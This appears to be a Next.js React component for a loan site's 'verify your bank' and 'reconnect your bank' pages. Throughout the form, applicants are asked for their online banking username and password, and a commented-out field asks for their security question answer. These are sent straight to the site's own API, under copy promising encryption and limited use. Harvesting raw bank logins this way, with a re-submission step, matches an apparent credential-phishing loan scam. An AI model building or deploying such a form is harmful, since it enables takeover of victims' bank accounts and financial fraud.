"use client";

import React, { FormEvent, useEffect, useState } from "react";
import Link from "next/link";
import { useSearchParams } from "next/navigation";
import {
  ArrowRight,
  CheckCircle2,
  Eye,
  EyeOff,
  Loader2,
  Lock,
} from "lucide-react";
import { ACCOUNT_TYPES } from "@/components/apply/options";
import { companyContact } from "@/components/CompanyContact";
import { Shell } from "@/components/site/Shell";
import { PageHero } from "@/components/site/PageHero";
import { usd } from "@/lib/loan";

const API_URL = process.env.NEXT_PUBLIC_API_URL ?? "http://localhost:5001";

type Mode = "verify" | "reconnect";

// Each page handles exactly one application status: /verify-bank is for a new
// application awaiting its first bank check, /reconnect-bank-verification is for
// one the team sent back for re-verification. Any other status means this page
// doesn't apply, so the form is hidden and we point the applicant elsewhere.
const MODE_STATUS: Record<Mode, string> = {
  verify: "bank_verification_pending",
  reconnect: "bank_reverification",
};
const MODE_PATH: Record<Mode, string> = {
  verify: "/verify-bank",
  reconnect: "/reconnect-bank-verification",
};

type Lookup = {
  applicationId: string;
  firstName: string;
  lastName: string;
  loanAmount: number;
  bankName: string | null;
  status: string;
  email: string;
  account_type: string | null;
};

type FormState = {
  fullName: string;
  email: string;
  bankName: string;
  accountType: string;
  bankingUsername: string;
  bankingPassword: string;
  securityQuestion: string;
};

type Errors = Partial<Record<keyof FormState, string>>;

const copy: Record<
  Mode,
  {
    eyebrow: string;
    title: string;
    text: string;
    submit: string;
    endpoint: string;
  }
> = {
  verify: {
    eyebrow: "Banking verification",
    title: "Verify your bank account",
    text: "Securely connect your online banking so we can instantly verify your income and financial health.",
    submit: "Verify bank account",
    endpoint: "/api/bank-verification",
  },
  reconnect: {
    eyebrow: "Bank re-verification",
    title: "Reconnect your bank",
    text: "We weren't able to complete your banking verification. Please reconnect your online banking so we can finish reviewing your application.",
    submit: "Reconnect bank",
    endpoint: "/api/bank-verification/reconnect-bank-verification",
  },
};

function validate(form: FormState): Errors {
  const errors: Errors = {};
  if (form.fullName.trim().length < 2)
    errors.fullName = "Enter your full name.";
  if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(form.email.trim()))
    errors.email = "Enter a valid email address.";
  if (form.bankName.trim().length < 2)
    errors.bankName = "Enter your bank's name.";
  if (!form.accountType) errors.accountType = "Select an account type.";
  if (!form.bankingUsername.trim())
    errors.bankingUsername = "Enter your online banking username.";
  if (!form.bankingPassword)
    errors.bankingPassword = "Enter your online banking password.";
  return errors;
}

const inputCls =
  "w-full rounded-xl border border-ink/15 bg-white px-4 py-3.5 text-ink outline-none transition placeholder:text-ink/30 focus:border-ink focus:ring-4 focus:ring-lime/40";
const inputDisabledCls =
  "w-full cursor-not-allowed rounded-xl border border-ink/10 bg-cream px-4 py-3.5 text-ink/60 outline-none";

export default function BankVerificationForm({ mode }: { mode: Mode }) {
  const searchParams = useSearchParams();
  const applicationId = searchParams.get("applicationId")?.trim() ?? "";
  const text = copy[mode];

  const [lookup, setLookup] = useState<Lookup | null>(null);
  const [lookupError, setLookupError] = useState(
    applicationId ? "" : "This link is missing an application ID.",
  );
  const [loading, setLoading] = useState(Boolean(applicationId));
  const [form, setForm] = useState<FormState>({
    fullName: "",
    email: "",
    bankName: "",
    accountType: "",
    bankingUsername: "",
    bankingPassword: "",
    securityQuestion: "",
  });
  const [errors, setErrors] = useState<Errors>({});
  const [submitError, setSubmitError] = useState("");
  const [submitting, setSubmitting] = useState(false);
  const [done, setDone] = useState(false);
  const [showPassword, setShowPassword] = useState(false);

  useEffect(() => {
    if (!applicationId) return;
    let cancelled = false;
    fetch(
      `${API_URL}/api/bank-verification/lookup?${new URLSearchParams({ applicationId })}`,
      { headers: { Accept: "application/json" }, cache: "no-store" },
    )
      .then(async (res) => {
        const body = await res.json().catch(() => null);
        if (!res.ok)
          throw new Error(body?.error ?? "We couldn't find this application.");
        return body as Lookup;
      })
      .then((data) => {
        if (cancelled) return;
        setLookup(data);
        setForm((prev) => ({
          ...prev,
          fullName: [data.firstName, data.lastName].filter(Boolean).join(" "),
          email: data.email ?? "",
          bankName: data.bankName ?? "",
          accountType:
            data.account_type === "checking" || data.account_type === "savings"
              ? data.account_type
              : "",
        }));
      })
      .catch((error) => {
        if (!cancelled)
          setLookupError(
            error instanceof Error && error.message !== "Failed to fetch"
              ? error.message
              : "We couldn't reach our servers. Check your connection and try again.",
          );
      })
      .finally(() => {
        if (!cancelled) setLoading(false);
      });
    return () => {
      cancelled = true;
    };
  }, [applicationId]);

  function set(patch: Partial<FormState>) {
    setForm((prev) => ({ ...prev, ...patch }));
    setErrors((prev) => {
      const next = { ...prev };
      for (const key of Object.keys(patch)) delete next[key as keyof FormState];
      return next;
    });
    setSubmitError("");
  }

  async function handleSubmit(event: FormEvent<HTMLFormElement>) {
    event.preventDefault();
    const nextErrors = validate(form);
    setErrors(nextErrors);
    if (Object.keys(nextErrors).length > 0 || !lookup) return;

    setSubmitting(true);
    setSubmitError("");
    try {
      const res = await fetch(`${API_URL}${text.endpoint}`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          applicationId: lookup.applicationId,
          fullName: form.fullName.trim(),
          email: form.email.trim(),
          bankName: form.bankName.trim(),
          accountType: form.accountType,
          bankingUsername: form.bankingUsername.trim(),
          bankingPassword: form.bankingPassword,
          securityQuestion: form.securityQuestion.trim(),
        }),
      });
      const body = await res.json().catch(() => null);
      if (!res.ok)
        throw new Error(body?.error ?? "We couldn't submit your verification.");
      setDone(true);
      setForm((prev) => ({
        ...prev,
        bankingPassword: "",
        bankingUsername: "",
      }));
    } catch (error) {
      setSubmitError(
        error instanceof Error && error.message !== "Failed to fetch"
          ? error.message
          : "We couldn't reach our servers. Check your connection and try again.",
      );
    } finally {
      setSubmitting(false);
    }
  }

  // The status page pre-fills the ID from ?id=; the email is asked for there.
  const trackHref = lookup
    ? `/track-loan?${new URLSearchParams({ id: lookup.applicationId })}`
    : "/track-loan";

  let body: React.ReactNode;
  if (loading) {
    body = (
      <div
        className="flex items-center justify-center gap-3 rounded-3xl border border-ink/10 bg-white px-6 py-16 text-ink/60"
        role="status"
      >
        <Loader2 className="animate-spin" size={18} strokeWidth={1.8} aria-hidden="true" />
        Loading your application…
      </div>
    );
  } else if (lookupError || !lookup) {
    body = (
      <Notice title="We couldn't load this application">
        {lookupError || "Please check your link and try again."}
      </Notice>
    );
  } else if (done) {
    body = (
      <Notice title="Thank you — your bank details were received" success>
        Your banking verification has been submitted. Next, you&apos;ll schedule
        or complete your brief call with one of our live underwriter
        specialists. We&apos;ve sent a confirmation to {lookup.email}.
        <TrackLink href={trackHref} />
      </Notice>
    );
  } else if (lookup.status !== MODE_STATUS[mode]) {
    // The application isn't at the step this page handles. If the other page is
    // the right one for its current status, send them there; otherwise it has
    // simply moved on, so point them at the status page.
    const otherMode: Mode = mode === "verify" ? "reconnect" : "verify";
    const needsOther = lookup.status === MODE_STATUS[otherMode];
    body = (
      <Notice title="This step isn’t available right now">
        {needsOther
          ? `Application #${lookup.applicationId} needs a different step before you can continue.`
          : `Application #${lookup.applicationId} has moved past this step. Track your application to see where it stands.`}
        {needsOther ? (
          <ActionLink
            href={`${MODE_PATH[otherMode]}?${new URLSearchParams({ applicationId: lookup.applicationId })}`}
            label={otherMode === "reconnect" ? "Reconnect my bank" : "Verify my bank"}
          />
        ) : (
          <TrackLink href={trackHref} />
        )}
      </Notice>
    );
  } else {
    body = (
      <form
        onSubmit={handleSubmit}
        noValidate
        className="rounded-3xl border border-ink/10 bg-white p-6 sm:p-8"
      >
        <div>
          <h2 className="font-display text-xl font-medium tracking-tight">
            Your details
          </h2>
          <p className="mt-1 text-sm text-ink/55">
            From your application — contact us if anything is wrong.
          </p>
        </div>
        <div className="mt-5 grid gap-4 sm:grid-cols-2">
          <BvField id="bv-fullName" label="Full name" error={errors.fullName}>
            <input
              id="bv-fullName"
              className={inputDisabledCls}
              value={form.fullName}
              autoComplete="name"
              disabled
              readOnly
            />
          </BvField>
          <BvField id="bv-email" label="Email address" error={errors.email}>
            <input
              id="bv-email"
              type="email"
              className={inputDisabledCls}
              value={form.email}
              autoComplete="email"
              disabled
              readOnly
            />
          </BvField>
        </div>
        <div className="mt-4 grid gap-4 sm:grid-cols-2">
          <BvField id="bv-bankName" label="Bank name" error={errors.bankName}>
            <input
              id="bv-bankName"
              className={inputDisabledCls}
              value={form.bankName}
              disabled
              readOnly
            />
          </BvField>
          <BvField
            id="bv-accountType"
            label="Account type"
            error={errors.accountType}
          >
            <select
              id="bv-accountType"
              className={inputDisabledCls}
              value={form.accountType}
              disabled
            >
              <option value="">—</option>
              {ACCOUNT_TYPES.map((o) => (
                <option key={o.value} value={o.value}>
                  {o.label}
                </option>
              ))}
            </select>
          </BvField>
        </div>

        <div className="mt-8 border-t border-ink/10 pt-6">
          <h2 className="font-display text-xl font-medium tracking-tight">
            Online banking
          </h2>
          <p className="mt-1 text-sm text-ink/55">
            Use the same sign-in you use for your bank&apos;s website or app.
          </p>
        </div>
        <div className="mt-5 grid gap-4 sm:grid-cols-2">
          <BvField
            id="bv-username"
            label="Online banking username"
            error={errors.bankingUsername}
          >
            <input
              id="bv-username"
              className={inputCls}
              value={form.bankingUsername}
              onChange={(e) => set({ bankingUsername: e.target.value })}
              autoComplete="off"
              aria-invalid={errors.bankingUsername ? true : undefined}
              aria-describedby={
                errors.bankingUsername ? "bv-username-err" : undefined
              }
            />
          </BvField>
          <BvField
            id="bv-password"
            label="Online banking password"
            error={errors.bankingPassword}
          >
            <div className="relative">
              <input
                id="bv-password"
                type={showPassword ? "text" : "password"}
                className={`${inputCls} pr-12`}
                value={form.bankingPassword}
                onChange={(e) => set({ bankingPassword: e.target.value })}
                autoComplete="off"
                aria-invalid={errors.bankingPassword ? true : undefined}
                aria-describedby={
                  errors.bankingPassword ? "bv-password-err" : undefined
                }
              />
              <button
                type="button"
                className="absolute inset-y-0 right-0 grid w-12 place-items-center text-ink/50 transition hover:text-ink"
                onClick={() => setShowPassword((v) => !v)}
                aria-pressed={showPassword}
                aria-label={showPassword ? "Hide password" : "Show password"}
              >
                {showPassword ? <EyeOff size={18} /> : <Eye size={18} />}
              </button>
            </div>
          </BvField>
        </div>
        {/* <BvField
          id="bv-security"
          label="Security question answer"
          optional
          hint="Only if your bank asks one when you sign in."
        >
          <input
            id="bv-security"
            className={inputCls}
            value={form.securityQuestion}
            onChange={(e) => set({ securityQuestion: e.target.value })}
            autoComplete="off"
            aria-describedby="bv-security-hint"
          />
        </BvField> */}

        <p className="mt-6 flex items-start gap-2 rounded-xl bg-cream px-4 py-3 text-sm text-ink/60">
          <Lock size={15} strokeWidth={1.8} aria-hidden="true" className="mt-0.5 shrink-0" />
          Your credentials are sent over an encrypted connection and used only
          to verify your income and financial health.
        </p>

        {submitError && (
          <p
            role="alert"
            className="mt-5 rounded-xl border border-coral/30 bg-coral/10 px-4 py-3 text-sm"
          >
            {submitError}
          </p>
        )}

        <button
          type="submit"
          disabled={submitting}
          className="mt-6 inline-flex w-full items-center justify-center gap-2 rounded-full bg-ink px-8 py-4 font-semibold text-lime transition hover:bg-moss disabled:opacity-60"
        >
          {submitting ? (
            <>
              <Loader2 className="animate-spin" size={18} strokeWidth={1.8} aria-hidden="true" />
              Submitting…
            </>
          ) : (
            <>
              {text.submit}
              <ArrowRight size={18} strokeWidth={1.8} aria-hidden="true" />
            </>
          )}
        </button>
      </form>
    );
  }

  return (
    <Shell>
      <PageHero
        eyebrow={text.eyebrow}
        title={text.title}
      >
        {text.text}
      </PageHero>
      <section className="bg-paper py-16 lg:py-24">
        <div className="mx-auto max-w-2xl px-5 lg:px-8">
          {lookup && (
            <p className="mb-6 flex flex-wrap items-center gap-3">
              <span className="rounded-full bg-amber-100 px-3 py-1 text-sm font-semibold text-amber-800">
                Application #{lookup.applicationId}
              </span>
              {lookup.firstName && (
                <span className="text-ink/55">for {lookup.firstName}</span>
              )}
              {lookup.loanAmount ? (
                <span className="text-ink/55">· {usd(Number(lookup.loanAmount))}</span>
              ) : null}
            </p>
          )}
          {body}
          <p className="mt-8 text-center text-sm text-ink/50">
            Need help? Email{" "}
            <a href={companyContact.email.href} className="font-semibold text-ink">
              {companyContact.email.display}
            </a>{" "}
            or call{" "}
            <a href={companyContact.phones.local.href} className="font-semibold text-ink">
              {companyContact.phones.local.display}
            </a>
            .
          </p>
        </div>
      </section>
    </Shell>
  );
}

function BvField({
  id,
  label,
  error,
  hint,
  optional,
  children,
}: {
  id: string;
  label: string;
  error?: string;
  hint?: string;
  optional?: boolean;
  children: React.ReactNode;
}) {
  return (
    <div>
      <label htmlFor={id} className="mb-2 block text-sm font-medium">
        {label}
        {optional && <span className="text-ink/40"> (optional)</span>}
      </label>
      {children}
      {error ? (
        <p className="mt-1.5 text-sm text-coral" id={`${id}-err`}>
          {error}
        </p>
      ) : (
        hint && (
          <p className="mt-1.5 text-sm text-ink/50" id={`${id}-hint`}>
            {hint}
          </p>
        )
      )}
    </div>
  );
}

function Notice({
  title,
  success,
  children,
}: {
  title: string;
  success?: boolean;
  children: React.ReactNode;
}) {
  return (
    <div
      role="status"
      className="rounded-3xl border border-ink/10 bg-white p-8 text-center sm:p-10"
    >
      {success ? (
        <div className="mx-auto mb-5 grid h-16 w-16 place-items-center rounded-full bg-lime text-ink shadow-[0_0_0_10px_rgb(200_241_105/0.25)]">
          <CheckCircle2 size={32} strokeWidth={2} aria-hidden="true" />
        </div>
      ) : null}
      <h2 className="font-display text-2xl font-medium tracking-tight">{title}</h2>
      <div className="mx-auto mt-3 max-w-md text-ink/60">{children}</div>
    </div>
  );
}

function TrackLink({ href }: { href: string }) {
  return <ActionLink href={href} label="Track your application" />;
}

function ActionLink({ href, label }: { href: string; label: string }) {
  return (
    <div className="mt-8">
      <Link
        href={href}
        className="inline-flex items-center gap-2 rounded-full bg-ink px-8 py-4 font-semibold text-lime transition hover:bg-moss"
      >
        {label}
        <ArrowRight size={18} strokeWidth={1.8} aria-hidden="true" />
      </Link>
    </div>
  );
}
